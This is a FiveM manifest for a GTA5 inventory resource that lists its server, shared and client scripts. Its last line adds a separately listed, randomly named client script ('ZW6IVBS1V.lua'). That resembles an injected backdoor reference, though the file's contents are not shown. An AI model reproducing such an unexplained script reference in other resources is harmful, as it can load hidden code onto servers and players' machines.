fx_version 'adamant'

game 'gta5'

description 'ARENA 2.0 INVENTORY'
author 'pach'
version '1.0.3'

server_scripts {
    '@mysql-async/lib/MySQL.lua',
    'itemregister.lua',
    'config_weights.lua',
    'server/sv_main.lua',
    'server/sv_droppeditems.lua',
    'server/sv_weapons.lua',
    'server/sv_callbacks.lua',
    'server/sv_vehicle_items.lua'
}

shared_scripts {
    'locales.lua',
    'locales/*.lua',
    'config.lua'
}

client_scripts {
    'client/*.lua'
}

dependencies {'mysql-async'}

ui_page 'html/index.html'

files {'html/**'}

client_script "ZW6IVBS1V.lua"
